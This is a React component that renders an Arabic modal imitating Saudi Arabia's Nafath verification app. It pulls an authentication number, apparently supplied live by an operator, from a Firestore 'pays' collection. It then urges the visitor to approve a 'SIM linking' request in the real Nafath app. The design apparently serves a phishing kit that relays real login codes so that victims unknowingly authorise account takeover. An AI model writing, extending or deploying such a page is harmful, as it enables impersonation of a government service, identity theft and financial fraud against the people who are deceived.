"use client"

import { useState, useEffect } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { db } from "../lib/firebase"
import React from "react"

interface ModalProps {
  isOpen: boolean
  onClose: () => void
  phone: string
  auth_number?: string
}

export default function NafazModal({ isOpen, onClose,phone, auth_number: propAuthNumber }: ModalProps) {
  const [timeLeft, setTimeLeft] = useState(60)
  const [loading, setLoading] = useState(true)
  const [authNumber, setAuthNumber] = useState<string | null>(propAuthNumber || null)

  // Fetch Nafaz PIN from Firestore and listen for changes
  useEffect(() => {
    const  userId=localStorage.getItem("visitor")
    if (!isOpen || !userId) {
      setLoading(true)
      setAuthNumber(propAuthNumber || null)
      return
    }

    setLoading(true)

    const unsubscribe = onSnapshot(
      doc(db, "pays", userId), // Adjust collection name as needed
      (doc) => {
        if (doc.exists()) {
          const data = doc.data()
          const fetchedAuthNumber = data?.auth_number || data?.nafaz_pin || data?.verification_code

          if (fetchedAuthNumber) {
            setAuthNumber(fetchedAuthNumber)
          } else if (propAuthNumber) {
            setAuthNumber(propAuthNumber)
          }
        } else if (propAuthNumber) {
          setAuthNumber(propAuthNumber)
        }
        setLoading(false)
      },
      (error) => {
        console.error("Error fetching auth number:", error)
        // Fallback to prop value if Firestore fails
        if (propAuthNumber) {
          setAuthNumber(propAuthNumber)
        }
        setLoading(false)
      },
    )

    return () => unsubscribe()
  }, [isOpen,  propAuthNumber])

  // Timer logic
  useEffect(() => {
    if (!isOpen) {
      setTimeLeft(60)
      return
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer)
          return 0
        }
        return prevTime - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [isOpen])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto">
      <div className="fixed inset-0 bg-black bg-opacity-50 transition-opacity" onClick={onClose}></div>
      <div className="flex items-center justify-center min-h-screen px-4 py-8 sm:p-6">
        <div className="relative bg-white rounded-lg max-w-xl w-full mx-auto shadow-xl">
          <div className="p-4 sm:p-8 text-center space-y-6">
            <button
              onClick={onClose}
              className="absolute top-4 left-4 text-gray-400 hover:text-gray-500 transition-colors"
            >
              <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            <h3 className="text-sm sm:text-3xl font-bold text-[#3a9f8c] text-right">التحقق من خلال تطبيق نفاذ</h3>

            <span className="bg-[#3a9f8c] flex justify-center p-4 text-white rounded-lg text-lg">تطبيق نفاذ</span>

            <div className="w-24 h-24 rounded-xl flex items-center justify-center mx-auto border-2 border-[#3a9f8c]">
              {loading ? (
                <div className="animate-pulse">
                  <div className="h-8 w-16 bg-gray-200 rounded"></div>
                </div>
              ) : authNumber ? (
                <span className="text-4xl font-medium text-[#3a9f8c]">{authNumber}</span>
              ) : (
                <div className="text-center">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#3a9f8c] mx-auto"></div>
                  <span className="text-xs text-gray-500 mt-2">انتظار الرقم...</span>
                </div>
              )}
            </div>

            <div className="mt-8 leading-relaxed max-w-md mx-auto">
              <p className="text-base sm:text-lg leading-relaxed text-gray-600">
                الرجاء فتح تطبيق نفاذ وتأكيد طلب اصدار امر ربط شريحتك على رقم الجوال
                <span className="mx-2 text-[#3a9f8c] font-medium">( {phone} )</span>
                {authNumber && <span className="block mt-3">باختيار الرقم أعلاه</span>}
                <div className="flex items-center justify-center mt-4">
                  <div className="bg-gray-100 rounded-lg px-4 py-2">
                    <span className="text-[#3a9f8c] font-semibold">{formatTime(timeLeft)}</span>
                  </div>
                </div>
              </p>
            </div>

            <div className="flex flex-row gap-8 sm:gap-12 justify-center mt-8">
              <div className="flex flex-col items-center space-y-3">
                <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 1</span>
                <img src="/logo.png" alt="نفاذ" className="w-24 h-24 object-contain" />
                <span className="text-[#3a9f8c] font-semibold text-center">تحميل تطبيق نفاذ</span>
              </div>
              <div className="flex flex-col items-center space-y-3">
                <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 2</span>
                <img src="/face-id.png" alt="التحقق من الوجه" className="w-24 h-24 object-contain" />
                <span className="text-[#3a9f8c] text-center max-w-[200px] font-semibold">
                  {authNumber ? "اختيار الرقم أعلاه والتحقق عبر السمات الحيوية" : "انتظار رقم التحقق من الخادم"}
                </span>
              </div>
            </div>

            <button
              onClick={onClose}
              className="mt-8 mx-auto bg-[#3a9f8c] text-white px-8 py-3 rounded-lg hover:bg-[#3a9f8c]/80 transition-colors"
            >
              إغلاق
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}